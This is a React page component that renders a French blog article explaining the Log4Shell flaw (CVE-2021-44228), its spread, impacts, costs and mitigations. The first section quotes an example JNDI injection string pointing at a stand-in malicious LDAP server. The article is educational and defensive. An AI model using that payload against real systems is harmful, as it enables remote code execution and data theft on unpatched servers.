"use client";

import { useEffect, useState } from "react";

type Section = {
  heading: string;
  content?: string;
  items?: { title: string; description: string }[];
};

export default function Log4ShellArticle() {
  const [data, setData] = useState<Section[] | null>(null);

  useEffect(() => {
    setData([
      {
        heading: "🕳️ 1. Quelle est la vulnérabilité exploitée ?",
        content:
          "Log4Shell (CVE-2021-44228) est une faille critique dans la bibliothèque Java Log4j. Elle permet une exécution de code à distance (RCE) en passant une simple chaîne comme `${jndi:ldap://malicious-server/exploit}`. Cela exploite le mécanisme de lookup JNDI de Log4j, capable de charger du code externe sans contrôle.",
      },
      {
        heading: "💥 2. Comment l’attaque s’est-elle déroulée ?",
        content:
          "L’attaquant injecte une chaîne malveillante dans une entrée utilisateur (comme un en-tête HTTP). Si cette donnée est loggée, Log4j contacte un serveur distant et exécute le code récupéré. Résultat : prise de contrôle du système, installation de malware, vol de données.",
      },
      {
        heading: "🌐 3. Qui a été touché ?",
        content:
          "Des milliers de services et entreprises à travers le monde : AWS, Google, iCloud, Steam, Minecraft, Microsoft, Cloudflare… mais aussi des PME, institutions et objets connectés. Environ 93 % des environnements cloud étaient vulnérables au moment de la divulgation.",
      },
      {
        heading: "📉 4. Quels ont été les impacts ?",
        items: [
          {
            title: "Contrôle à distance",
            description:
              "Les attaquants pouvaient exécuter des commandes arbitraires sur les serveurs compromis.",
          },
          {
            title: "Vol et fuite de données",
            description:
              "Identifiants, mots de passe, secrets API ou d’infrastructure exfiltrés.",
          },
          {
            title: "Interruption de services",
            description:
              "Des milliers de sites indisponibles (ex : 4000 sites publics au Québec), attaques de ransomwares et création de botnets.",
          },
        ],
      },
      {
        heading: "💸 5. Quel coût selon la taille de l’entreprise ?",
        items: [
          {
            title: "Petite entreprise",
            description:
              "Plusieurs milliers à dizaines de milliers d’euros (pertes d’activité, frais de réponse à incident).",
          },
          {
            title: "Moyenne entreprise",
            description:
              "Dizaines à centaines de milliers d’euros (gestion de crise, remédiation technique).",
          },
          {
            title: "Grande entreprise",
            description:
              "Plusieurs millions d’euros. Le coût moyen d’un incident Log4Shell dépasse 90 000 $, hors impact sur la réputation.",
          },
        ],
      },
      {
        heading: "🛡️ 6. Comment s’en protéger ?",
        items: [
          {
            title: "Mise à jour",
            description:
              "Migrer vers Log4j ≥ 2.17.1. Si impossible, supprimer `JndiLookup.class` manuellement.",
          },
          {
            title: "Mesures de contournement",
            description:
              "Désactiver les lookups via `log4j2.formatMsgNoLookups=true`. Bloquer les flux sortants LDAP/RMI non nécessaires.",
          },
          {
            title: "Audit et surveillance",
            description:
              "Scanner les applications, surveiller les logs pour détection de tentatives d’exploitation.",
          },
        ],
      },
      {
        heading: "🚧 7. Pourquoi est-ce difficile à éviter ?",
        content:
          "Log4j est souvent une dépendance indirecte, difficile à repérer. Les correctifs ont été publiés en plusieurs étapes, rendant la gestion confuse. De nombreux systèmes ne sont pas maintenus, et l’effet domino via les chaînes d’approvisionnement logicielles complique la détection.",
      },
      {
        heading: "🏢 8. Dans le contexte de votre entreprise, que faire ?",
        items: [
          {
            title: "Cartographie des dépendances",
            description:
              "Identifier toutes les bibliothèques Log4j, même transitive.",
          },
          {
            title: "Mise à jour proactive",
            description:
              "Corriger en priorité les versions exposées. Supprimer les composants vulnérables.",
          },
          {
            title: "Plan d’incident et sensibilisation",
            description:
              "Préparer une réponse à incident. Former les équipes sur les dépendances open source et la gestion des vulnérabilités.",
          },
        ],
      },
    ]);
  }, []);

  if (!data) return <p className="text-center py-10">Chargement...</p>;

  return (
    <main className="min-h-screen bg-gray-100 text-gray-800">
      <div className="max-w-4xl mx-auto px-6 py-12">
        <h1 className="text-4xl font-bold mb-2 text-indigo-900">
          Log4Shell – Analyse d’une faille critique
        </h1>
        <p className="text-sm text-gray-500 mb-6">
          Étude détaillée de la faille CVE-2021-44228 – Contexte, impact,
          protections et enseignements.
        </p>

        {data.map((section, i) => (
          <section key={i} className="mb-12">
            <h2 className="text-2xl font-semibold text-indigo-700 mb-3">
              {section.heading}
            </h2>
            <p className="mb-4 text-gray-700">{section.content}</p>
            {section.items && (
              <ul className="space-y-4">
                {section.items.map((item, j) => (
                  <li
                    key={j}
                    className="bg-white shadow rounded p-4 border-l-4 border-indigo-500"
                  >
                    <h3 className="font-semibold text-lg">{item.title}</h3>
                    <p className="text-gray-600">{item.description}</p>
                  </li>
                ))}
              </ul>
            )}
          </section>
        ))}

        <footer className="mt-10 text-center text-gray-400 text-sm">
          © {new Date().getFullYear()} Mon Blog.
        </footer>
      </div>
    </main>
  );
}
